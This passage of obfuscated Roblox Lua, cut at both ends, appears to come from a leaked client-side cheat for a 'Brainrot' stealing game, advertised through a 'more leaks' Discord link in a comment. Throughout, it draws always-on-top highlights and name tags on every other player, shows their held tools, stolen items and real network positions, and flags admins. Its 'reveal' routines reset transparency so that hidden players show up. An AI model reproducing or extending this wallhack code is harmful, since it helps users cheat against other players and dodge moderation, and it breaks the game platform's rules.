			param102.LineJoinMode = Enum.LineJoinMode.Round
			param102.Transparency = 0

			local ok = pcall(function()
				param102.BorderOffset = UDim.new(0, 0)
				param102.BorderStrokePosition = Enum.BorderStrokePosition.Outer
				param102.StrokeSizingMode = Enum.StrokeSizingMode.ScaledSize
			end)

			param102.Thickness = ok and flag248 or param103
			return ok
		end

		local function createTextLabel(name, parent, zIndex)
			local textLabel = Instance.new("TextLabel")
			textLabel.Name = name
			textLabel.AnchorPoint = Vector2.new(0, 0.5)
			textLabel.BackgroundTransparency = 1
			textLabel.FontFace = font2
			textLabel.Text = ""
			textLabel.TextScaled = true
			textLabel.TextStrokeTransparency = 1
			textLabel.TextXAlignment = Enum.TextXAlignment.Center
			textLabel.TextYAlignment = Enum.TextYAlignment.Center
			textLabel.ZIndex = zIndex
			textLabel.Parent = parent
			return textLabel
		end

		local function func363(player8, hasTool)
			local result25 = func360()
			local visible = tbl71.Name == true
			local text = tbl71.Username == true
			local visible2 = tbl71.Avatar == true
			local tool2 = tbl71.Tool == true
			local visible3 = tbl71.Brainrot == true
			local visible4 = tbl71["Admin Panel"] == true
			local n15 = visible2 and math.floor(result25 * 0.72) or 0
			local n16 = tool2 and math.floor(result25 * 0.82) or 0
			local n17 = math.floor(result25 * 0.7)
			local n18 = math.max(1, math.floor(result25 * 0.04))
			local targetPlayer = player8.TargetPlayer
			text = text and targetPlayer.Name or targetPlayer.DisplayName
			player8.DisplayName.Text = text
			player8.NameShadow.Text = text
			local n19 = math.floor(math.clamp(func361(player8.DisplayName.Text, font2, n17) + 4, n17, 230))
			local value262 = tool2 and hasTool
			local n20 = 0
			local n21 = 0

			if visible2 then
				n20 = 0 + n15
			end

			local n22 = 0

			if visible then
				if not (n20 > 0) then
					n22 = n20
				else
					n22 = n20 + n18
				end

				n20 = n22 + n19
			end

			local n23 = 0

			if value262 then
				if not (n20 > 0) then
					n23 = n20
				else
					n23 = n20 + n18
				end

				n20 = n23 + n16
			end

			local n24 = math.max(n20, 1)
			visible3 = visible3 and type(player8.BrainrotName) == "string" and player8.BrainrotName ~= ""
			local n25 = math.floor(result25 * 0.88)
			local n26 = -math.max(2, math.floor(result25 * 0.16))
			local brainrotName = visible3 and player8.BrainrotName or ""
			local n27 = visible3 and math.floor(math.clamp(func361(brainrotName, font2, n25) + 6, n25, 320)) or 0
			local visible5 = visible3 and type(player8.BrainrotGeneration) == "string" and player8.BrainrotGeneration ~= ""
			local brainrotGeneration = visible5 and player8.BrainrotGeneration or ""
			local n28 = math.max(2, math.floor(result25 * 0.12))
			local n29 = visible5 and math.floor(math.clamp(func361(brainrotGeneration, font2, n25) + 4, n25, 150)) or 0
			local n30 = n27 + (visible5 and n28 + n29 or 0)
			local n31 = visible and n22 + n19 * 0.5 or n24 * 0.5
			local n32 = n31 - n30 * 0.5
			local n33 = math.min(0, n32)
			local n34 = math.max(n24, n32 + n30)
			local ceiled = math.ceil(n34 - n33)
			visible4 = visible4 and player8.IsAdmin == true
			local n35 = math.max(1, math.floor(result25 * 0.6))
			local n36 = visible4 and math.floor(math.clamp(func361("Admin Panel", font, n35) + 3, n35, 150)) or 0
			local n37 = n35 + -math.max(2, math.floor(result25 * 0.2))
			local brainrotMutation = visible3 and player8.BrainrotMutation or nil
			local visible6 = brainrotMutation ~= nil
			local n38 = math.floor(result25 * 0.62)
			local n39 = -math.max(1, math.floor(result25 * 0.1))
			local n40 = visible6 and math.floor(math.clamp(func361(brainrotMutation.Text:gsub("<[^<>]->", ""), font2, n38) + 6, n38, 260)) or 0
			local n41 = visible6 and n38 + n39 or 0
			local n42 = n31 - n40 * 0.5
			local n43
			-- more leaks: https://discord.gg/x7YbZeezpm

			if visible6 then
				n43 = math.min(n33, n42)
				ceiled = math.ceil(math.max(n34, n42 + n40) - n43)
			else
				n43 = n33
			end

			local n44 = visible3 and n25 + n26 or 0
			local n45 = n37 + n41 + n44 + result25
			local n46 = -n43
			local n47 = n46 + n32
			local n48 = (n37 + n41 + n44 + result25 * 0.5) / n45
			local n49 = visible3 and (n37 + n41 + n25 * 0.5) / n45 or 0
			local n50 = visible6 and (n37 + n38 * 0.5) / n45 or 0
			local n51 = visible4 and n35 * 0.5 / n45 or 0
			local n52 = 1 / ceiled
			local n53 = 1 / n45
			player8.HasTool = hasTool
			player8.Billboard.Size = UDim2.fromOffset(ceiled, n45)
			player8.DisplayName.Visible = visible
			player8.NameShadow.Visible = visible
			player8.Avatar.Visible = visible2
			player8.ToolIcon.Visible = tool2 and player8.ToolIcon.Image ~= ""
			player8.ToolShadow.Visible = tool2 and player8.ToolShadow.Image ~= ""
			player8.Avatar.Position = UDim2.fromScale((n46 + n21) / ceiled, n48)
			player8.Avatar.Size = UDim2.fromScale(n15 / ceiled, n15 / n45)
			player8.DisplayName.Position = UDim2.fromScale((n46 + n22) / ceiled, n48)
			player8.DisplayName.Size = UDim2.fromScale(n19 / ceiled, n17 / n45)
			player8.NameShadow.Position = UDim2.fromScale((n46 + n22) / ceiled + n52, n48 + n53)
			player8.NameShadow.Size = player8.DisplayName.Size
			player8.ToolIcon.Position = UDim2.fromScale((n46 + n23) / ceiled, n48)
			player8.ToolIcon.Size = UDim2.fromScale(n16 / ceiled, n16 / n45)
			player8.ToolShadow.Position = UDim2.fromScale((n46 + n23) / ceiled + n52, n48 + n53)
			player8.ToolShadow.Size = player8.ToolIcon.Size
			player8.AdminLine.Visible = visible4

			if visible4 then
				player8.AdminLine.Position = UDim2.fromScale((n46 + n31) / ceiled, n51)
				player8.AdminLine.Size = UDim2.fromScale(n36 / ceiled, n35 / n45)
				player8.AdminText.Position = UDim2.fromScale(0, 0.5)
				player8.AdminText.Size = UDim2.fromScale(n36 / n36, 1)
				player8.AdminShadow.Position = UDim2.fromScale(1 / n36, 0.5 + 1 / n35)
				player8.AdminShadow.Size = player8.AdminText.Size
			end

			player8.MutationText.Visible = visible6
			player8.MutationShadow.Visible = visible6

			if visible6 then
				player8.MutationText.RichText = brainrotMutation.RichText
				player8.MutationText.Text = brainrotMutation.Text
				player8.MutationText.TextColor3 = brainrotMutation.Color

				if brainrotMutation.Font then
					player8.MutationText.FontFace = brainrotMutation.Font
					player8.MutationShadow.FontFace = brainrotMutation.Font
				end

				local uiStroke = player8.MutationText:FindFirstChildOfClass("UIStroke")

				if uiStroke and brainrotMutation.StrokeColor then
					uiStroke.Color = brainrotMutation.StrokeColor
				end

				player8.MutationShadow.RichText = false
				player8.MutationShadow.Text = brainrotMutation.Text:gsub("<[^<>]->", "")

				if brainrotMutation.Gradient then
					player8.MutationGradient.Color = brainrotMutation.Gradient.Color
					player8.MutationGradient.Rotation = brainrotMutation.Gradient.Rotation
					player8.MutationGradient.Enabled = true
				else
					player8.MutationGradient.Enabled = false
				end

				player8.MutationText.Position = UDim2.fromScale((n46 + n42) / ceiled, n50)
				player8.MutationText.Size = UDim2.fromScale(n40 / ceiled, n38 / n45)
				player8.MutationShadow.Position = UDim2.fromScale((n46 + n42) / ceiled + n52, n50 + n53)
				player8.MutationShadow.Size = player8.MutationText.Size
			end

			player8.BrainrotText.Text = brainrotName
			player8.BrainrotShadow.Text = brainrotName
			player8.BrainrotText.Visible = visible3
			player8.BrainrotShadow.Visible = visible3
			player8.GenerationText.Text = brainrotGeneration
			player8.GenerationShadow.Text = brainrotGeneration
			player8.GenerationText.Visible = visible5
			player8.GenerationShadow.Visible = visible5

			if visible3 then
				local n54 = n47 / ceiled
				player8.BrainrotText.Position = UDim2.fromScale(n54, n49)
				player8.BrainrotText.Size = UDim2.fromScale(n27 / ceiled, n25 / n45)
				player8.BrainrotShadow.Position = UDim2.fromScale(n54 + n52, n49 + n53)
				player8.BrainrotShadow.Size = player8.BrainrotText.Size

				if visible5 then
					local n55 = (n47 + n27 + n28) / ceiled
					player8.GenerationText.Position = UDim2.fromScale(n55, n49)
					player8.GenerationText.Size = UDim2.fromScale(n29 / ceiled, n25 / n45)
					player8.GenerationShadow.Position = UDim2.fromScale(n55 + n52, n49 + n53)
					player8.GenerationShadow.Size = player8.GenerationText.Size
				end
			end
		end

		local function func364(player9, instance54, flag249)
			local value263 = flag249 or instance54
			local highlight = Instance.new("Highlight")
			highlight.Name = "PlayerHighlight"
			highlight.Adornee = instance54.Parent
			highlight.DepthMode = Enum.HighlightDepthMode.AlwaysOnTop
			highlight.FillColor = Color3.fromRGB(0, 67, 148)
			highlight.FillTransparency = 0.76
			highlight.OutlineColor = Color3.fromRGB(72, 207, 255)
			highlight.OutlineTransparency = 0.02
			highlight.Parent = value255
			local billboardGui = Instance.new("BillboardGui")
			billboardGui.Name = "PlayerTag"
			billboardGui.Adornee = value263
			billboardGui.AlwaysOnTop = true
			billboardGui.LightInfluence = 0
			billboardGui.MaxDistance = 1000
			billboardGui.Size = UDim2.fromOffset(1, 1)
			billboardGui.StudsOffsetWorldSpace = func352(instance54, value263)
			billboardGui.Parent = value255
			local boxHandleAdornment = Instance.new("BoxHandleAdornment")
			boxHandleAdornment.Name = "NetworkPosition"
			boxHandleAdornment.Adornee = value263
			boxHandleAdornment.AlwaysOnTop = true
			boxHandleAdornment.CFrame = CFrame.new(0, 1.2, 0)
			boxHandleAdornment.Color3 = Color3.fromRGB(72, 207, 255)
			boxHandleAdornment.Size = Vector3.new(3.2, 5.2, 2.2)
			boxHandleAdornment.Transparency = 0.78
			boxHandleAdornment.Visible = false
			boxHandleAdornment.ZIndex = 1
			boxHandleAdornment.Parent = value255
			local frame = Instance.new("Frame")
			frame.Name = "Content"
			frame.Size = UDim2.fromScale(1, 1)
			frame.BackgroundTransparency = 1
			frame.Parent = billboardGui
			local imageLabel = Instance.new("ImageLabel")
			imageLabel.Name = "Avatar"
			imageLabel.AnchorPoint = Vector2.new(0, 0.5)
			imageLabel.BackgroundTransparency = 1
			imageLabel.ScaleType = Enum.ScaleType.Crop
			imageLabel.Parent = frame
			local uiAspectRatioConstraint = Instance.new("UIAspectRatioConstraint")
			uiAspectRatioConstraint.AspectRatio = 1
			uiAspectRatioConstraint.Parent = imageLabel
			local uiCorner = Instance.new("UICorner")
			uiCorner.CornerRadius = UDim.new(1, 0)
			uiCorner.Parent = imageLabel
			local NameShadow = createTextLabel("NameShadow", frame, 1)
			NameShadow.Text = player9.DisplayName
			NameShadow.TextColor3 = Color3.fromRGB(7, 19, 34)
			NameShadow.TextTransparency = 0.05
			local DisplayName = createTextLabel("DisplayName", frame, 2)
			DisplayName.Text = player9.DisplayName
			DisplayName.TextColor3 = Color3.fromRGB(255, 255, 255)
			local uiStroke = Instance.new("UIStroke")
			func362(uiStroke, Color3.fromRGB(255, 255, 255), 0.044, 1.4)
			uiStroke.Parent = DisplayName
			local uiGradient = Instance.new("UIGradient")
			uiGradient.Color = colorSequence
			uiGradient.Rotation = 90
			uiGradient.Parent = uiStroke
			local uiGradient2 = Instance.new("UIGradient")
			uiGradient2.Color = value234
			uiGradient2.Rotation = 90
			uiGradient2.Parent = DisplayName
			local BrainrotShadow = createTextLabel("BrainrotShadow", frame, 3)
			BrainrotShadow.TextColor3 = Color3.fromRGB(25, 0, 4)
			local BrainrotText = createTextLabel("BrainrotText", frame, 4)
			BrainrotText.TextColor3 = Color3.fromRGB(255, 255, 255)
			local uiStroke2 = Instance.new("UIStroke")
			func362(uiStroke2, Color3.fromRGB(124, 0, 15), 0.052, 1.7)
			uiStroke2.Parent = BrainrotText
			local uiGradient3 = Instance.new("UIGradient")
			uiGradient3.Color = value240
			uiGradient3.Rotation = 90
			uiGradient3.Parent = uiStroke2
			local uiGradient4 = Instance.new("UIGradient")
			uiGradient4.Color = value237
			uiGradient4.Rotation = 90
			uiGradient4.Parent = BrainrotText
			local MutationShadow = createTextLabel("MutationShadow", frame, 3)
			MutationShadow.TextColor3 = Color3.fromRGB(0, 0, 0)
			MutationShadow.TextTransparency = 0.15
			local MutationText = createTextLabel("MutationText", frame, 4)
			MutationText.TextColor3 = Color3.fromRGB(255, 255, 255)
			MutationText.RichText = true
			local uiStroke3 = Instance.new("UIStroke")
			func362(uiStroke3, Color3.fromRGB(0, 0, 0), 0.05, 1.5)
			uiStroke3.Transparency = 0.15
			uiStroke3.Parent = MutationText
			local uiGradient5 = Instance.new("UIGradient")
			uiGradient5.Enabled = false
			uiGradient5.Rotation = 90
			uiGradient5.Parent = MutationText
			local GenerationShadow = createTextLabel("GenerationShadow", frame, 3)
			GenerationShadow.TextColor3 = Color3.fromRGB(18, 48, 0)
			GenerationShadow.TextTransparency = 0.08
			local GenerationText = createTextLabel("GenerationText", frame, 4)
			GenerationText.TextColor3 = Color3.fromRGB(115, 255, 0)
			local uiStroke4 = Instance.new("UIStroke")
			func362(uiStroke4, Color3.fromRGB(0, 0, 0), 0.05, 1.5)
			uiStroke4.Transparency = 0.3
			uiStroke4.Parent = GenerationText
			local imageLabel2 = Instance.new("ImageLabel")
			imageLabel2.Name = "ToolShadow"
			imageLabel2.AnchorPoint = Vector2.new(0, 0.5)
			imageLabel2.BackgroundTransparency = 1
			imageLabel2.ImageColor3 = Color3.fromRGB(0, 0, 0)
			imageLabel2.ImageTransparency = 0.35
			imageLabel2.ScaleType = Enum.ScaleType.Fit
			imageLabel2.Visible = false
			imageLabel2.ZIndex = 1
			imageLabel2.Parent = frame
			local uiAspectRatioConstraint2 = Instance.new("UIAspectRatioConstraint")
			uiAspectRatioConstraint2.AspectRatio = 1
			uiAspectRatioConstraint2.Parent = imageLabel2
			local imageLabel3 = Instance.new("ImageLabel")
			imageLabel3.Name = "ToolIcon"
			imageLabel3.AnchorPoint = Vector2.new(0, 0.5)
			imageLabel3.BackgroundTransparency = 1
			imageLabel3.ScaleType = Enum.ScaleType.Fit
			imageLabel3.Visible = false
			imageLabel3.ZIndex = 2
			imageLabel3.Parent = frame
			local uiAspectRatioConstraint3 = Instance.new("UIAspectRatioConstraint")
			uiAspectRatioConstraint3.AspectRatio = 1
			uiAspectRatioConstraint3.Parent = imageLabel3
			local frame2 = Instance.new("Frame")
			frame2.Name = "AdminLine"
			frame2.AnchorPoint = Vector2.new(0.5, 0.5)
			frame2.BackgroundTransparency = 1
			frame2.BorderSizePixel = 0
			frame2.Visible = false
			frame2.ZIndex = 3
			frame2.Parent = frame
			local AdminShadow = createTextLabel("AdminShadow", frame2, 3)
			AdminShadow.AnchorPoint = Vector2.new(0, 0.5)
			AdminShadow.FontFace = font
			AdminShadow.Text = "Admin Panel"
			AdminShadow.TextColor3 = Color3.fromRGB(10, 14, 22)
			AdminShadow.TextTransparency = 0.08
			local AdminText = createTextLabel("AdminText", frame2, 4)
			AdminText.AnchorPoint = Vector2.new(0, 0.5)
			AdminText.FontFace = font
			AdminText.Text = "Admin Panel"
			AdminText.TextColor3 = Color3.fromRGB(255, 255, 255)
			local uiStroke5 = Instance.new("UIStroke")
			func362(uiStroke5, Color3.fromRGB(10, 24, 45), 0.02, 1.45)
			uiStroke5.Transparency = 0.02
			uiStroke5.Parent = AdminText
			local uiGradient6 = Instance.new("UIGradient")
			local colorSequence2 = ColorSequence.new
			local value264 = ColorSequenceKeypoint.new(0, Color3.fromRGB(255, 255, 255))
			local value265 = ColorSequenceKeypoint.new(0.55, Color3.fromRGB(235, 242, 255))
			local tbl75 = { value264, value265 }

			do
				local values = table.pack(ColorSequenceKeypoint.new(1, Color3.fromRGB(255, 255, 255)))
				table.move(values, 1, values.n, 3, tbl75)
			end

			uiGradient6.Color = colorSequence2(tbl75)
			uiGradient6.Rotation = 90
			uiGradient6.Parent = AdminText

			local tbl76 = {
				TargetPlayer = player9,
				PlayerHighlight = highlight,
				NetworkTracker = boxHandleAdornment,
				NetworkAnchor = value263,
				VisualHead = instance54,
				Billboard = billboardGui,
				Avatar = imageLabel,
				NameShadow = NameShadow,
				DisplayName = DisplayName,
				BrainrotShadow = BrainrotShadow,
				BrainrotText = BrainrotText,
				BrainrotGradient = uiGradient4,
				BrainrotStrokeGradient = uiGradient3,
				GenerationShadow = GenerationShadow,
				GenerationText = GenerationText,
				MutationShadow = MutationShadow,
				MutationText = MutationText,
				MutationGradient = uiGradient5,
				ToolShadow = imageLabel2,
				ToolIcon = imageLabel3,
				AdminLine = frame2,
				AdminShadow = AdminShadow,
				AdminText = AdminText,
				BrainrotName = nil,
				BrainrotGeneration = nil,
				BrainrotMutation = nil,
				IsAdmin = false,
				HasTool = false,
			}

			func363(tbl76, false)
			return tbl76
		end

		local function func365(player10)
			local tag = player10.Tag
			local character_ = player10.Character
			if not tag or not character_ then
				return false
			end
			local visualHead = tag.VisualHead
			local networkAnchor = tag.NetworkAnchor
			if not visualHead or not visualHead:IsDescendantOf(character_) or not networkAnchor or not networkAnchor:IsDescendantOf(character_) then
				return false
			end
			tag.Billboard.Adornee = networkAnchor
			local visible = networkAnchor ~= visualHead and (networkAnchor.Position - visualHead.Position).Magnitude >= n11
			tag.PlayerHighlight.Enabled = not visible
			tag.NetworkTracker.Adornee = networkAnchor
			tag.NetworkTracker.Visible = visible
			return true
		end

		local function func366(obj80)
			if obj80:GetAttribute("AdminCommands") == true then
				return true
			end
			local attribute = obj80:GetAttribute("Role")
			return type(attribute) == "string" and string.find(string.lower(attribute), "admin", 1, true) ~= nil
		end

		local function func367(flag250, param104)
			if not flag250.Tag then
				return
			end
			flag250.Tag.IsAdmin = func366(param104)
			func363(flag250.Tag, flag250.Tag.HasTool == true)
		end

		local function func368(player11)
			if not player11.Tag or not player11.Character then
				return
			end
			local flag251 = func350(func351(player11.Character))
			local visible = flag251 ~= ""
			player11.Tag.ToolIcon.Image = flag251
			player11.Tag.ToolIcon.Visible = visible
			player11.Tag.ToolShadow.Image = flag251
			player11.Tag.ToolShadow.Visible = visible
			func363(player11.Tag, visible)
		end

		local function func369(flag252)
			if not flag252.Tag then
				return
			end
			flag252.Tag.BrainrotName = flag252.BrainrotName
			flag252.Tag.BrainrotGeneration = flag252.BrainrotGeneration
			flag252.Tag.BrainrotMutation = func358(flag252.BrainrotMutationLabel)
			func363(flag252.Tag, flag252.Tag.HasTool == true)
			local brainrotGeneration2 = func342(flag252.BrainrotGeneration)

			if flag252.Tag.BrainrotGradient then
				flag252.Tag.BrainrotGradient.Color = brainrotGeneration2.Text
			end

			if flag252.Tag.BrainrotStrokeGradient then
				flag252.Tag.BrainrotStrokeGradient.Color = brainrotGeneration2.Stroke
			end

			if flag252.BrainrotHighlight and (tbl71.Brainrot ~= true or flag252.BrainrotHighlight.Adornee ~= flag252.BrainrotModel) then
				flag252.BrainrotHighlight:Destroy()
				flag252.BrainrotHighlight = nil
			end

			if tbl71.Brainrot == true and flag252.BrainrotModel and flag252.BrainrotModel.Parent and not flag252.BrainrotHighlight then
				local highlight = Instance.new("Highlight")
				highlight.Name = "BrainrotHighlight"
				highlight.Adornee = flag252.BrainrotModel
				highlight.DepthMode = Enum.HighlightDepthMode.AlwaysOnTop
				highlight.FillTransparency = 0.68
				highlight.OutlineTransparency = 0
				highlight.Parent = value255
				flag252.BrainrotHighlight = highlight
			end

			if flag252.BrainrotHighlight then
				flag252.BrainrotHighlight.FillColor = brainrotGeneration2.Fill
				flag252.BrainrotHighlight.OutlineColor = brainrotGeneration2.Outline
			end
		end

		local function func370(param105)
			if param105.BrainrotGenerationConnection then
				param105.BrainrotGenerationConnection:Disconnect()
				param105.BrainrotGenerationConnection = nil
			end

			local func371 = ipairs
			local brainrotMutationConnections = param105.BrainrotMutationConnections or {}

			for _, brainrotMutationConnection in func371(brainrotMutationConnections) do
				brainrotMutationConnection:Disconnect()
			end

			param105.BrainrotMutationConnections = nil
			param105.BrainrotMutationLabel = nil
		end

		local function func372(param106, brainrotMutationLabel, param107)
			if not brainrotMutationLabel then
				return
			end
			param106.BrainrotMutationLabel = brainrotMutationLabel
			local brainrotMutationConnections = {}

			local function func373()
				if param106.BrainrotModel == param107 then
					func369(param106)
				end
			end

			brainrotMutationConnections[#brainrotMutationConnections + 1] = brainrotMutationLabel:GetPropertyChangedSignal("Text"):Connect(func373)
			brainrotMutationConnections[#brainrotMutationConnections + 1] = brainrotMutationLabel:GetPropertyChangedSignal("Visible"):Connect(func373)
			brainrotMutationConnections[#brainrotMutationConnections + 1] = brainrotMutationLabel:GetPropertyChangedSignal("TextColor3"):Connect(func373)
			param106.BrainrotMutationConnections = brainrotMutationConnections
		end

		local function func374(param108, obj81)
			param108.StealingVersion = param108.StealingVersion + 1
			local stealingVersion = param108.StealingVersion

			if obj81:GetAttribute("Stealing") ~= true then
				func370(param108)
				param108.BrainrotName = nil
				param108.BrainrotGeneration = nil
				param108.BrainrotModel = nil
				func369(param108)
				return
			end

			task.spawn(function()
				for i_ = 1, 7 do
					if not flag241 or param108.StealingVersion ~= stealingVersion or tbl72[obj81] ~= param108 then
						return
					end
					local value266, value267, value268, obj82, value269 = func359(obj81)

					if value266 then
						func370(param108)
						param108.BrainrotName = value266
						param108.BrainrotModel = value267
						param108.BrainrotGeneration = value268
						func372(param108, value269, value267)

						if obj82 then
							param108.BrainrotGenerationConnection = obj82:GetPropertyChangedSignal("Text"):Connect(function()
								if param108.BrainrotModel == value267 then
									param108.BrainrotGeneration = obj82.Text
									func369(param108)
								end
							end)
						end

						func369(param108)
						return
					end

					if i_ < 7 then
						task.wait(0.12)
					end
				end

				if param108.StealingVersion == stealingVersion then
					func370(param108)
					param108.BrainrotName = nil
					param108.BrainrotGeneration = nil
					param108.BrainrotModel = nil
					func369(param108)
				end
			end)
		end

		local function func375(param109, player12, flag253)
			local image = tbl73[player12.UserId]

			if image == nil then
				local ok

				ok, image = pcall(function()
					return Players:GetUserThumbnailAsync(player12.UserId, Enum.ThumbnailType.HeadShot, Enum.ThumbnailSize.Size100x100)
				end)

				image = ok and image or ""
				tbl73[player12.UserId] = image
			end

			if flag241 and param109.Version == flag253 and param109.Tag and param109.Tag.Avatar.Parent then
				param109.Tag.Avatar.Image = image
			end
		end

		local flag254 = false

		local function func376(instance55)
			if instance55:IsA("BasePart") then
				return instance55.Name ~= "HumanoidRootPart"
			end
			return instance55:IsA("Decal") or instance55:IsA("Texture")
		end

		local function func377(param110, instance56)
			if flag254 or not instance56.Parent then
				return
			end
			local transparency2 = instance56.Transparency

			if transparency2 <= n12 then
				param110.RevealOriginals[instance56] = transparency2
				param110.RevealHidden[instance56] = nil
				return
			end

			if param110.RevealOriginals[instance56] == nil then
				return
			end
			param110.RevealHidden[instance56] = transparency2
			flag254 = true

			pcall(function()
				instance56.Transparency = transparency

				if instance56:IsA("BasePart") then
					instance56.LocalTransparencyModifier = 0
				end
			end)

			flag254 = false
		end

		local function func378(list56, instance57)
			if list56.RevealBound[instance57] then
				return
			end
			list56.RevealBound[instance57] = true
			local transparency2 = instance57.Transparency

			if transparency2 <= n12 then
				list56.RevealOriginals[instance57] = transparency2
			elseif instance57:IsA("BasePart") and byName3[instance57.Name] then
				list56.RevealOriginals[instance57] = 0
			elseif instance57:IsA("Decal") and string.lower(instance57.Name) == "face" then
				list56.RevealOriginals[instance57] = 0
			end

			list56.RevealConnections[#list56.RevealConnections + 1] = instance57:GetPropertyChangedSignal("Transparency"):Connect(function()
				if flag241 then
					func377(list56, instance57)
				end
			end)

			func377(list56, instance57)
		end

		local function func379(list57, list58)
			for _, descendant in ipairs(list58:GetDescendants()) do
				if func376(descendant) then
					func378(list57, descendant)
				end
			end

			list57.RevealConnections[#list57.RevealConnections + 1] = list58.DescendantAdded:Connect(function(descendant)
				if flag241 and func376(descendant) then
					func378(list57, descendant)
				end
			end)
		end

		local function func380(list59)
			func345(list59.RevealConnections)
			flag254 = true

			for k, value270 in pairs(list59.RevealHidden) do
				if k.Parent then
					pcall(function()
						k.Transparency = value270
					end)
				end
			end

			flag254 = false
			table.clear(list59.RevealHidden)
			table.clear(list59.RevealOriginals)
			table.clear(list59.RevealBound)
		end

		local function func381(player13)
			func345(player13.CharacterConnections)
			func346(player13)
			func380(player13)
			func370(player13)

			if player13.BrainrotHighlight then
				player13.BrainrotHighlight:Destroy()
				player13.BrainrotHighlight = nil
			end

			player13.BrainrotModel = nil
			player13.BrainrotGeneration = nil

			if player13.Tag then
				if player13.Tag.PlayerHighlight then
					player13.Tag.PlayerHighlight:Destroy()
				end

				if player13.Tag.NetworkTracker then
					player13.Tag.NetworkTracker:Destroy()
				end

				player13.Tag.Billboard:Destroy()
				player13.Tag = nil
			end

			player13.Character = nil
			player13.BindingCharacter = nil
		end

		local value271 = nil

		value271 = function(player14, player15, character_)
			func381(player14)
			player14.Version = player14.Version + 1
			local version = player14.Version
			if not flag241 or not character_ then
				return
			end
			player14.Character = character_
			player14.BindingCharacter = character_
			func347(player14, character_)
			func379(player14, character_)

			local function func382()
				task.defer(function()
					if flag241 and player14.Version == version then
						func368(player14)
					end
				end)
			end

			player14.CharacterConnections[#player14.CharacterConnections + 1] = character_.ChildAdded:Connect(function(child)
				if child:IsA("Tool") then
					func382()
				elseif child:IsA("Humanoid") then
					func347(player14, character_)
				end
			end)

			player14.CharacterConnections[#player14.CharacterConnections + 1] = character_.ChildRemoved:Connect(function(child)
				if child:IsA("Tool") then
					func382()
				end
			end)

			player14.CharacterConnections[#player14.CharacterConnections + 1] = character_.AncestryChanged:Connect(function()
				if not flag241 or player14.Version ~= version or character_ ~= player15.Character then
					return
				end

				if character_:IsDescendantOf(Workspace) then
					if not player14.Tag then
						task.defer(function()
							if flag241 and player14.Version == version then
								value271(player14, player15, character_)
							end
						end)
					end

					return
				end

				player14.Version = player14.Version + 1
				func381(player14)
			end)

			task.spawn(function()
				local head = character_:FindFirstChild("Head") or character_:WaitForChild("Head", 5)

				if not flag241 or player14.Version ~= version or character_ ~= player15.Character or not character_:IsDescendantOf(Workspace) or not head or not head:IsDescendantOf(character_) then
					if player14.Version == version then
						player14.BindingCharacter = nil
					end

					return
				end

				local value272 = func348(character_, head)
				player14.Tag = func364(player15, head, value272)
				func365(player14)
				player14.BindingCharacter = nil

				player14.CharacterConnections[#player14.CharacterConnections + 1] = head.AncestryChanged:Connect(function()
					if not flag241 or player14.Version ~= version or head:IsDescendantOf(character_) then
						return
					end
					player14.Version = player14.Version + 1
					func381(player14)
					local character_2 = player15.Character

					if character_2 and character_2:IsDescendantOf(Workspace) then
						task.defer(function()
							if flag241 and tbl72[player15] == player14 then
								value271(player14, player15, character_2)
							end
						end)
					end
				end)

				func367(player14, player15)
				func368(player14)
				func374(player14, player15)
				func375(player14, player15, version)
			end)
		end

		local function func383(player)
			local entry21 = tbl72[player]
			if not entry21 then
				return
			end
			entry21.Version = entry21.Version + 1
			entry21.StealingVersion = entry21.StealingVersion + 1
			func381(entry21)
			func345(entry21.PlayerConnections)
			tbl72[player] = nil
		end

		local function func384(player)
			if player == localPlayer or tbl72[player] then
				return
			end

			local tbl77 = {
				Version = 0,
				StealingVersion = 0,
				Character = nil,
				BindingCharacter = nil,
				Tag = nil,
				BrainrotName = nil,
				BrainrotGeneration = nil,
				BrainrotGenerationConnection = nil,
				BrainrotModel = nil,
				BrainrotHighlight = nil,
				NameDisplayHumanoid = nil,
				NameDisplayDistance = nil,
				RevealOriginals = {},
				RevealHidden = {},
				RevealBound = {},
				RevealConnections = {},
				CharacterConnections = {},
				PlayerConnections = {},
			}

			tbl72[player] = tbl77

			for _, item60 in ipairs({ "AdminCommands", "Role" }) do
				tbl77.PlayerConnections[#tbl77.PlayerConnections + 1] = player:GetAttributeChangedSignal(item60):Connect(function()
					if flag241 and tbl72[player] == tbl77 then
						func367(tbl77, player)
					end
				end)
			end

			tbl77.PlayerConnections[#tbl77.PlayerConnections + 1] = player.CharacterAdded:Connect(function(character_)
				value271(tbl77, player, character_)
			end)

			tbl77.PlayerConnections[#tbl77.PlayerConnections + 1] = player.CharacterRemoving:Connect(function(character_)
				if tbl77.Character == character_ then
					tbl77.Version = tbl77.Version + 1
					func381(tbl77)
				end
			end)

			tbl77.PlayerConnections[#tbl77.PlayerConnections + 1] = player:GetPropertyChangedSignal("Character"):Connect(function()
				task.defer(function()
					if not flag241 or tbl72[player] ~= tbl77 then
						return
					end
					local character_ = player.Character

					if character_ ~= tbl77.Character then
						value271(tbl77, player, character_)
					elseif tbl77.Tag then
						local adornee = tbl77.Tag.Billboard.Adornee

						if not adornee or not adornee:IsDescendantOf(Workspace) then
							value271(tbl77, player, character_)
						end
					end
				end)
			end)

			tbl77.PlayerConnections[#tbl77.PlayerConnections + 1] = player:GetAttributeChangedSignal("Stealing"):Connect(function()
				func374(tbl77, player)
			end)

			value271(tbl77, player, player.Character)
		end

		local function func385()
			for k, value273 in pairs(tbl72) do
				local character_ = k.Character

				if character_ and character_:IsDescendantOf(Workspace) then
					local tag = value273.Tag
					local billboard = tag and tag.Billboard
					tag = tag and tag.PlayerHighlight
					local adornee = billboard and billboard.Adornee
					local parent = billboard and billboard.Parent and adornee and adornee:IsDescendantOf(character_) and tag and tag.Parent and func365(value273)

					if (value273.Character ~= character_ or not parent) and value273.BindingCharacter ~= character_ then
						value271(value273, k, character_)
					end
				elseif value273.Character then
					value273.Version = value273.Version + 1
					func381(value273)
				end
			end
		end

		local function func386()
			flag241 = false
			n14 += 1
			func345(list50)
			local list60 = {}

			for k in pairs(tbl72) do
				list60[#list60 + 1] = k
			end

			for _, item61 in ipairs(list60) do
				func383(item61)
			end
		end

		local function func387()
			for _, value274 in pairs(tbl72) do
				if value274.Tag and value274.Tag.Billboard.Parent then
					func363(value274.Tag, value274.Tag.HasTool == true)
				end
			end
		end

		local function func388()
			for _, value275 in pairs(tbl72) do
				if value275.Tag and value275.Tag.Billboard.Parent then
					func368(value275)
					func369(value275)
				end
			end
		end

		local function func389()
			func386()
			flag241 = true
			local value276 = n14
			list50[#list50 + 1] = Players.PlayerAdded:Connect(func384)
			list50[#list50 + 1] = Players.PlayerRemoving:Connect(func383)
			local currentCamera = Workspace.CurrentCamera

